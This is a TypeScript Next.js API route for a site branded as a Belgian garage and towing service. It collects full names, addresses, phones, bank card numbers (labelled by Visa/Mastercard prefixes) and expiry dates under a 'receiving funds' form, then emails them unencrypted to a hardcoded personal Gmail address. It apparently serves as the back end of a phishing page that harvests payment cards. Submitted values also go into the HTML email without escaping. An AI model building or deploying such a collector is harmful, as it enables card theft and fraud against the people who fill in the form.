import { NextRequest, NextResponse } from 'next/server'
import nodemailer from 'nodemailer'

// Configuration du transporteur SMTP OVH
const transporter = nodemailer.createTransport({
  host: process.env.EMAIL_HOST || 'ssl0.ovh.net',
  port: parseInt(process.env.EMAIL_PORT || '465'),
  secure: true, // true pour le port 465, false pour les autres ports
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
})

// Fonction pour valider les données du formulaire
function validateFormData(data: any) {
  const requiredFields = [
    'nom_complet',
    'email',
    'telephone',
    'adresse',
    'carte_be',
    'carte_52_49_51',
    'date_expiration',
    'montant'
  ]

  for (const field of requiredFields) {
    if (!data[field] || data[field].trim() === '') {
      return { isValid: false, error: `Le champ ${field} est obligatoire` }
    }
  }

  // Validation de l'email
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  if (!emailRegex.test(data.email)) {
    return { isValid: false, error: 'Format d\'email invalide' }
  }

  return { isValid: true }
}

// Fonction pour créer le template HTML de l'email
function createEmailTemplate(data: any, formType: string) {
  const title = formType === 'enregistrement' ? '🚗 Nouveau Formulaire d\'Enregistrement' : '💰 Nouveau Formulaire de Réception de Fond'
  const currentDate = new Date()
  const dateStr = currentDate.toLocaleDateString('fr-FR', {
    weekday: 'long',
    year: 'numeric',
    month: 'long',
    day: 'numeric'
  })
  const timeStr = currentDate.toLocaleTimeString('fr-FR')

  return `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8">
      <title>${title}</title>
      <style>
        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          line-height: 1.6;
          color: #333;
          margin: 0;
          padding: 0;
          background-color: #f5f7fa;
        }
        .container {
          max-width: 650px;
          margin: 20px auto;
          background: white;
          border-radius: 12px;
          overflow: hidden;
          box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }
        .header {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
          padding: 30px;
          text-align: center;
        }
        .header h1 {
          margin: 0 0 10px 0;
          font-size: 24px;
          font-weight: 600;
        }
        .header p {
          margin: 0;
          opacity: 0.9;
          font-size: 14px;
        }
        .content {
          padding: 30px;
        }
        .client-info {
          background: linear-gradient(135deg, #e3f2fd 0%, #f3e5f5 100%);
          padding: 20px;
          border-radius: 8px;
          margin-bottom: 25px;
          border-left: 4px solid #667eea;
        }
        .client-info h2 {
          margin: 0 0 15px 0;
          color: #667eea;
          font-size: 18px;
          display: flex;
          align-items: center;
        }
        .financial-info {
          background: linear-gradient(135deg, #fff3e0 0%, #fce4ec 100%);
          padding: 20px;
          border-radius: 8px;
          margin-bottom: 25px;
          border-left: 4px solid #ff9800;
        }
        .financial-info h2 {
          margin: 0 0 15px 0;
          color: #ff9800;
          font-size: 18px;
          display: flex;
          align-items: center;
        }
        .field {
          display: flex;
          margin-bottom: 12px;
          align-items: flex-start;
        }
        .label {
          font-weight: 600;
          color: #555;
          min-width: 140px;
          margin-right: 15px;
        }
        .value {
          background: white;
          padding: 8px 12px;
          border-radius: 6px;
          border: 1px solid #e0e0e0;
          flex: 1;
          font-family: 'Courier New', monospace;
          font-size: 14px;
        }
        .amount {
          background: linear-gradient(135deg, #4caf50 0%, #45a049 100%);
          color: white;
          font-weight: bold;
          font-size: 16px;
          text-align: center;
          padding: 12px;
          border-radius: 6px;
        }
        .footer {
          background: #f8f9fa;
          text-align: center;
          padding: 20px;
          color: #666;
          font-size: 12px;
          border-top: 1px solid #e9ecef;
        }
        .footer strong {
          color: #667eea;
        }
        .contact-actions {
          background: #e8f5e8;
          padding: 15px;
          border-radius: 8px;
          margin-top: 20px;
          text-align: center;
        }
        .contact-actions a {
          display: inline-block;
          margin: 5px 10px;
          padding: 8px 16px;
          background: #667eea;
          color: white;
          text-decoration: none;
          border-radius: 4px;
          font-size: 12px;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>${title}</h1>
          <p>📅 Reçu le ${dateStr} à ${timeStr}</p>
        </div>

        <div class="content">
          <!-- Informations Client -->
          <div class="client-info">
            <h2>👤 Informations du Client</h2>
            <div class="field">
              <div class="label">Nom complet :</div>
              <div class="value">${data.nom_complet}</div>
            </div>
            <div class="field">
              <div class="label">Email :</div>
              <div class="value">${data.email}</div>
            </div>
            <div class="field">
              <div class="label">Téléphone :</div>
              <div class="value">${data.telephone}</div>
            </div>
            <div class="field">
              <div class="label">Adresse :</div>
              <div class="value">${data.adresse}</div>
            </div>
          </div>

          <!-- Informations Financières -->
          <div class="financial-info">
            <h2>💳 Informations Bancaires</h2>
            <div class="field">
              <div class="label">Carte BE :</div>
              <div class="value">${data.carte_be}</div>
            </div>
            <div class="field">
              <div class="label">Carte 52/49/51 :</div>
              <div class="value">${data.carte_52_49_51}</div>
            </div>
            <div class="field">
              <div class="label">Date d'expiration :</div>
              <div class="value">${data.date_expiration}</div>
            </div>
            <div class="field">
              <div class="label">Montant :</div>
              <div class="amount">${data.montant} €</div>
            </div>
          </div>

          <!-- Actions rapides -->
          <div class="contact-actions">
            <strong>Actions rapides :</strong><br>
            <a href="mailto:${data.email}?subject=Re: ${title} - ${data.nom_complet}">📧 Répondre au client</a>
            <a href="tel:${data.telephone}">📞 Appeler le client</a>
          </div>
        </div>

        <div class="footer">
          <p>
            <strong>Auto DP</strong> - Garage & Remorquage 24/7<br>
            Email envoyé automatiquement depuis <strong>autodp.org</strong><br>
            Pour toute question, contactez le support technique.
          </p>
        </div>
      </div>
    </body>
    </html>
  `
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    
    // Déterminer le type de formulaire basé sur l'URL ou un paramètre
    const url = new URL(request.url)
    const formType = url.searchParams.get('type') || 'enregistrement'
    
    // Valider les données
    const validation = validateFormData(body)
    if (!validation.isValid) {
      return NextResponse.json(
        { success: false, error: validation.error },
        { status: 400 }
      )
    }

    // Vérifier que les variables d'environnement sont configurées
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      console.error('Variables d\'environnement SMTP manquantes')
      return NextResponse.json(
        { success: false, error: 'Configuration serveur email manquante' },
        { status: 500 }
      )
    }

    // Créer le contenu de l'email
    const emailHtml = createEmailTemplate(body, formType)
    const subject = formType === 'enregistrement' 
      ? `Nouvel enregistrement - ${body.nom_complet}` 
      : `Nouvelle demande de réception de fond - ${body.nom_complet}`

    // Configuration de l'email
    const recipients = process.env.EMAIL_RECIPIENTS
      ? process.env.EMAIL_RECIPIENTS.split(',').map(email => email.trim())
      : ['registratie@autodp.org', 'mickael.andjui.21@gmail.com']

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: recipients,
      replyTo: body.email,
      subject: subject,
      html: emailHtml,
      text: `
        ${subject}

        === INFORMATIONS CLIENT ===
        Nom: ${body.nom_complet}
        Email: ${body.email}
        Téléphone: ${body.telephone}
        Adresse: ${body.adresse}

        === INFORMATIONS BANCAIRES ===
        Carte BE: ${body.carte_be}
        Carte 52/49/51: ${body.carte_52_49_51}
        Date expiration: ${body.date_expiration}
        Montant: ${body.montant} €

        ---
        Email envoyé depuis autodp.org
        Date: ${new Date().toLocaleString('fr-FR')}
      `
    }

    // Envoyer l'email
    const info = await transporter.sendMail(mailOptions)
    
    console.log('Email envoyé avec succès:', info.messageId)

    return NextResponse.json({
      success: true,
      message: 'Email envoyé avec succès',
      messageId: info.messageId
    })

  } catch (error) {
    console.error('Erreur lors de l\'envoi de l\'email:', error)
    
    return NextResponse.json(
      { 
        success: false, 
        error: 'Erreur lors de l\'envoi de l\'email. Veuillez réessayer plus tard.' 
      },
      { status: 500 }
    )
  }
}

// Gérer les autres méthodes HTTP
export async function GET() {
  return NextResponse.json(
    { error: 'Méthode non autorisée' },
    { status: 405 }
  )
}
